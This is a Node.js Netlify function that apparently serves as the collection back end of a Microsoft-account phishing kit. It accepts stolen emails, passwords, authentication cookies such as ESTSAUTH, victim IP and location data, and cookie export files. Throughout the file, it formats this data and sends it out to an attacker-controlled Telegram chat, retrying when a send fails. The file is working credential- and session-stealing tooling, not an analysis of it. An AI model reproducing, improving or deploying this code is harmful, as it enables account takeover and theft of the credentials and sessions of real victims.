/**
 * ENHANCED Telegram Bot Function for Netlify
 * Handles credential and cookie data transmission with IP detection and file export
 * Supports comprehensive Microsoft domain cookie capture with location data
 */

const https = require('https');

// ENHANCED: Telegram configuration with better error handling
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ENHANCED: Validation function
function validateTelegramConfig() {
  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error('TELEGRAM_BOT_TOKEN environment variable is required');
  }
  if (!TELEGRAM_CHAT_ID) {
    throw new Error('TELEGRAM_CHAT_ID environment variable is required');
  }
  return true;
}

// ENHANCED: Message formatting with location data and file information
function formatTelegramMessage(data) {
  const {
    email = '',
    password = '',
    passwordSource = 'unknown',
    cookies = [],
    locationData = {},
    cookieFiles = {},
    authenticationTokens = null,
    userAgent = '',
    sessionId = '',
    url = '',
    timestamp = '',
    validated = false,
    microsoftAccount = false,
    domain = '',
    rawCookies = '',
    captureContext = {},
    browserCapabilities = {},
    retryAttempt = 0,
    enhancedCapture = false
  } = data;

  // ENHANCED: Message structure with location and file data
  let message = '🔐 *Microsoft Account Credentials Captured*\n';
  if (enhancedCapture) {
    message += '🚀 *ENHANCED CAPTURE WITH LOCATION & FILES*\n';
  }
  message += '\n';
  
  // Credential information
  if (email) {
    message += `📧 *Email:* \`${email}\`\n`;
  }
  if (password) {
    message += `🔑 *Password:* \`${password}\`\n`;
  }
  
  // ENHANCED: Location information
  if (locationData && locationData.ip && locationData.ip !== 'Unknown') {
    message += '\n🌍 *Location Information:*\n';
    message += `📍 *IP Address:* \`${locationData.ip}\`\n`;
    message += `🏙️ *City:* ${locationData.city}\n`;
    message += `🗺️ *Region:* ${locationData.region}\n`;
    message += `🌎 *Country:* ${locationData.country} (${locationData.countryCode})\n`;
    if (locationData.timezone) {
      message += `⏰ *Timezone:* ${locationData.timezone}\n`;
    }
    if (locationData.isp) {
      message += `🌐 *ISP:* ${locationData.isp}\n`;
    }
  }
  
  // Validation status
  message += '\n✅ *Account Status:*\n';
  message += `• Validated: ${validated ? 'Yes' : 'No'}\n`;
  message += `• Microsoft Account: ${microsoftAccount ? 'Yes' : 'No'}\n`;
  
  // Source information
  message += `• Source: ${passwordSource}\n`;
  if (domain) {
    message += `• Domain: ${domain}\n`;
  }
  
  // ENHANCED: Cookie information with file details
  if (cookies && cookies.length > 0) {
    message += `\n🍪 *Cookie Information:*\n`;
    message += `• Total Cookies: ${cookies.length}\n`;
    
    // Show important Microsoft cookies
    const importantCookies = cookies.filter(cookie => 
      cookie.name && (
        cookie.name.includes('ESTSAUTH') ||
        cookie.name.includes('SignInStateCookie') ||
        cookie.name.includes('ESTSAUTHPERSISTENT') ||
        cookie.name.includes('ESTSAUTHLIGHT')
      )
    );
    
    if (importantCookies.length > 0) {
      message += `• Auth Cookies: ${importantCookies.length} found\n`;
      message += '• Key Auth Cookies:\n';
      importantCookies.slice(0, 3).forEach(cookie => {
        message += `  - ${cookie.name}: ${cookie.value ? cookie.value.substring(0, 20) + '...' : 'empty'}\n`;
      });
    }
    
    // ENHANCED: Cookie file information
    if (cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)) {
      message += '\n📁 *Cookie Export Files:*\n';
      if (cookieFiles.txtFile) {
        message += `• TXT File: ${cookieFiles.txtFile.name} (${Math.round(cookieFiles.txtFile.size / 1024)}KB)\n`;
      }
      if (cookieFiles.jsonFile) {
        message += `• JSON File: ${cookieFiles.jsonFile.name} (${Math.round(cookieFiles.jsonFile.size / 1024)}KB)\n`;
      }
    }
  }
  
  // Browser and technical information
  if (browserCapabilities && browserCapabilities.browser) {
    message += `\n🌐 *Browser:* ${browserCapabilities.browser} v${browserCapabilities.version}\n`;
  }
  
  if (userAgent) {
    message += `📱 *User Agent:* \`${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\`\n`;
  }
  
  // ENHANCED: Capture context with location and file info
  if (captureContext && Object.keys(captureContext).length > 0) {
    message += '\n📊 *Capture Details:*\n';
    if (captureContext.hostname) {
      message += `• Hostname: ${captureContext.hostname}\n`;
    }
    if (captureContext.microsoftDomainCapture) {
      message += `• Microsoft Domain Capture: Yes\n`;
    }
    if (captureContext.locationDataCaptured) {
      message += `• Location Data: Captured\n`;
    }
    if (captureContext.cookieFilesCreated) {
      message += `• Cookie Files: Created\n`;
    }
    if (captureContext.hasStoredCredentials !== undefined) {
      message += `• Stored Credentials: ${captureContext.hasStoredCredentials ? 'Yes' : 'No'}\n`;
    }
    if (captureContext.injectorVersion) {
      message += `• Injector Version: ${captureContext.injectorVersion}\n`;
    }
    if (retryAttempt > 0) {
      message += `• Retry Attempt: ${retryAttempt + 1}\n`;
    }
  }
  
  // Timestamp and session
  message += `\n⏰ *Timestamp:* ${timestamp || new Date().toISOString()}\n`;
  if (sessionId) {
    message += `🔗 *Session ID:* \`${sessionId}\`\n`;
  }
  if (url) {
    message += `🔗 *URL:* ${url}\n`;
  }
  
  return message;
}

// ENHANCED: Cookie file content formatting for Telegram
function formatCookieFileContent(cookieFiles) {
  if (!cookieFiles || (!cookieFiles.txtFile && !cookieFiles.jsonFile)) {
    return null;
  }
  
  let fileMessage = '📁 *Cookie Export Files Content:*\n\n';
  
  if (cookieFiles.txtFile) {
    fileMessage += `📄 *${cookieFiles.txtFile.name}*\n`;
    fileMessage += '```\n';
    // Truncate content if too long for Telegram
    const content = cookieFiles.txtFile.content;
    if (content.length > 3000) {
      fileMessage += content.substring(0, 3000) + '\n... (truncated)\n';
    } else {
      fileMessage += content + '\n';
    }
    fileMessage += '```\n\n';
  }
  
  if (cookieFiles.jsonFile) {
    fileMessage += `📄 *${cookieFiles.jsonFile.name}*\n`;
    fileMessage += '```json\n';
    // Truncate JSON content if too long
    const jsonContent = cookieFiles.jsonFile.content;
    if (jsonContent.length > 2000) {
      try {
        const parsed = JSON.parse(jsonContent);
        const truncated = {
          ...parsed,
          cookies: parsed.cookies ? parsed.cookies.slice(0, 5) : []
        };
        if (parsed.cookies && parsed.cookies.length > 5) {
          truncated.truncated = `... and ${parsed.cookies.length - 5} more cookies`;
        }
        fileMessage += JSON.stringify(truncated, null, 2) + '\n';
      } catch (e) {
        fileMessage += jsonContent.substring(0, 2000) + '\n... (truncated)\n';
      }
    } else {
      fileMessage += jsonContent + '\n';
    }
    fileMessage += '```\n';
  }
  
  return fileMessage;
}

// ENHANCED: Cookie details formatting with better organization
function formatCookieDetails(cookies) {
  if (!cookies || cookies.length === 0) {
    return 'No cookies captured';
  }
  
  let cookieMessage = `🍪 *Detailed Cookie Analysis (${cookies.length} total):*\n\n`;
  
  // Group cookies by importance
  const authCookies = [];
  const sessionCookies = [];
  const trackingCookies = [];
  const otherCookies = [];
  
  cookies.forEach(cookie => {
    if (!cookie.name) return;
    
    const name = cookie.name.toLowerCase();
    if (name.includes('estsauth') || 
        name.includes('signinstatecookie') ||
        name.includes('estsauthpersistent') ||
        name.includes('estsauthlight') ||
        name.includes('buid') ||
        name.includes('esctx')) {
      authCookies.push(cookie);
    } else if (name.includes('session') || 
               name.includes('sess') ||
               name.includes('sid')) {
      sessionCookies.push(cookie);
    } else if (name.includes('track') ||
               name.includes('analytics') ||
               name.includes('_ga') ||
               name.includes('_gid')) {
      trackingCookies.push(cookie);
    } else {
      otherCookies.push(cookie);
    }
  });
  
  // Format auth cookies (most important)
  if (authCookies.length > 0) {
    cookieMessage += '🎯 *Authentication Cookies:*\n';
    authCookies.forEach((cookie, index) => {
      cookieMessage += `${index + 1}. \`${cookie.name}\`\n`;
      cookieMessage += `   Value: ${cookie.value ? cookie.value.substring(0, 60) + '...' : 'empty'}\n`;
      if (cookie.domain) cookieMessage += `   Domain: ${cookie.domain}\n`;
      if (cookie.secure) cookieMessage += `   Secure: Yes\n`;
      if (cookie.expires) cookieMessage += `   Expires: ${cookie.expires}\n`;
      cookieMessage += '\n';
    });
  }
  
  // Format session cookies
  if (sessionCookies.length > 0) {
    cookieMessage += '🔗 *Session Cookies:*\n';
    sessionCookies.slice(0, 5).forEach((cookie, index) => {
      cookieMessage += `${index + 1}. \`${cookie.name}\`: ${cookie.value ? cookie.value.substring(0, 40) + '...' : 'empty'}\n`;
    });
    if (sessionCookies.length > 5) {
      cookieMessage += `... and ${sessionCookies.length - 5} more session cookies\n`;
    }
    cookieMessage += '\n';
  }
  
  // Format other cookies (summary only)
  if (trackingCookies.length > 0) {
    cookieMessage += `📊 *Tracking Cookies:* ${trackingCookies.length} found\n`;
  }
  if (otherCookies.length > 0) {
    cookieMessage += `📋 *Other Cookies:* ${otherCookies.length} additional cookies\n`;
  }
  
  return cookieMessage;
}

// ENHANCED: Telegram API call with better error handling and retry logic
async function sendToTelegram(message, retryCount = 0) {
  const maxRetries = 3;
  
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 15000 // 15 second timeout for enhanced data
    };

    const req = https.request(options, (res) => {
      let data = '';
      
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ Enhanced message sent to Telegram successfully');
            resolve(response);
          } else {
            console.error('❌ Telegram API error:', response);
            
            // Retry on server errors
            if (res.statusCode >= 500 && retryCount < maxRetries) {
              console.log(`🔄 Server error, retrying in ${(retryCount + 1) * 1000}ms...`);
              setTimeout(() => {
                sendToTelegram(message, retryCount + 1)
                  .then(resolve)
                  .catch(reject);
              }, (retryCount + 1) * 1000);
            } else {
              reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
            }
          }
        } catch (parseError) {
          console.error('❌ Failed to parse Telegram response:', parseError);
          reject(new Error('Invalid response from Telegram API'));
        }
      });
    });

    req.on('error', (error) => {
      console.error('❌ Request error:', error);
      
      // Retry on network errors
      if (retryCount < maxRetries) {
        console.log(`🔄 Network error, retrying in ${(retryCount + 1) * 2000}ms...`);
        setTimeout(() => {
          sendToTelegram(message, retryCount + 1)
            .then(resolve)
            .catch(reject);
        }, (retryCount + 1) * 2000);
      } else {
        reject(error);
      }
    });

    req.on('timeout', () => {
      req.destroy();
      const timeoutError = new Error('Request timeout');
      
      // Retry on timeout
      if (retryCount < maxRetries) {
        console.log(`🔄 Timeout, retrying in ${(retryCount + 1) * 2000}ms...`);
        setTimeout(() => {
          sendToTelegram(message, retryCount + 1)
            .then(resolve)
            .catch(reject);
        }, (retryCount + 1) * 2000);
      } else {
        reject(timeoutError);
      }
    });

    req.write(postData);
    req.end();
  });
}

// ENHANCED: Main handler function with comprehensive error handling and file support
exports.handler = async (event, context) => {
  // Set CORS headers for all responses
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'CORS preflight successful' })
    };
  }

  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ 
        error: 'Method not allowed',
        message: 'Only POST requests are accepted'
      })
    };
  }

  try {
    // Validate Telegram configuration
    validateTelegramConfig();

    // Parse request body
    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
    } catch (parseError) {
      console.error('❌ Failed to parse request body:', parseError);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid JSON',
          message: 'Request body must be valid JSON'
        })
      };
    }

    // ENHANCED: Data validation with location and file support
    const {
      email,
      password,
      passwordSource = 'unknown',
      cookies = [],
      locationData = {},
      cookieFiles = {},
      authenticationTokens,
      userAgent,
      sessionId,
      url,
      timestamp,
      validated = false,
      microsoftAccount = false,
      domain,
      rawCookies,
      captureContext = {},
      browserCapabilities = {},
      retryAttempt = 0,
      enhancedCapture = false
    } = requestData;

    // Validate that we have meaningful data to send
    if (!email && !password && (!cookies || cookies.length === 0)) {
      console.warn('⚠️ No meaningful data provided');
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'No data provided',
          message: 'At least email, password, or cookies must be provided'
        })
      };
    }

    console.log('📨 Processing enhanced Telegram message with data:', {
      hasEmail: !!email,
      hasPassword: !!password,
      cookieCount: cookies.length,
      source: passwordSource,
      validated,
      microsoftAccount,
      hasLocationData: !!(locationData && locationData.ip),
      hasCookieFiles: !!(cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)),
      enhancedCapture,
      retryAttempt
    });

    // Format and send main message with enhanced data
    const mainMessage = formatTelegramMessage(requestData);
    await sendToTelegram(mainMessage);

    // ENHANCED: Send cookie details as separate message if we have cookies
    if (cookies && cookies.length > 0) {
      try {
        const cookieMessage = formatCookieDetails(cookies);
        await sendToTelegram(cookieMessage);
        console.log('✅ Cookie details sent successfully');
      } catch (cookieError) {
        console.warn('⚠️ Failed to send cookie details:', cookieError.message);
        // Don't fail the main request if cookie details fail
      }
    }

    // ENHANCED: Send cookie file content as separate message if available
    if (cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)) {
      try {
        const fileMessage = formatCookieFileContent(cookieFiles);
        if (fileMessage) {
          await sendToTelegram(fileMessage);
          console.log('✅ Cookie file content sent successfully');
        }
      } catch (fileError) {
        console.warn('⚠️ Failed to send cookie file content:', fileError.message);
        // Don't fail the main request if file content fails
      }
    }

    // ENHANCED: Success response with comprehensive data summary
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true,
        message: 'Enhanced data sent to Telegram successfully',
        timestamp: new Date().toISOString(),
        dataProcessed: {
          email: !!email,
          password: !!password,
          cookies: cookies.length,
          locationData: !!(locationData && locationData.ip),
          cookieFiles: !!(cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)),
          validated,
          microsoftAccount,
          enhancedCapture
        }
      })
    };

  } catch (error) {
    console.error('❌ Enhanced handler error:', error);
    
    // Return appropriate error response
    const isConfigError = error.message.includes('environment variable');
    const statusCode = isConfigError ? 500 : 400;
    
    return {
      statusCode,
      headers,
      body: JSON.stringify({ 
        error: 'Enhanced processing failed',
        message: isConfigError ? 'Server configuration error' : error.message,
        timestamp: new Date().toISOString()
      })
    };
  }
};
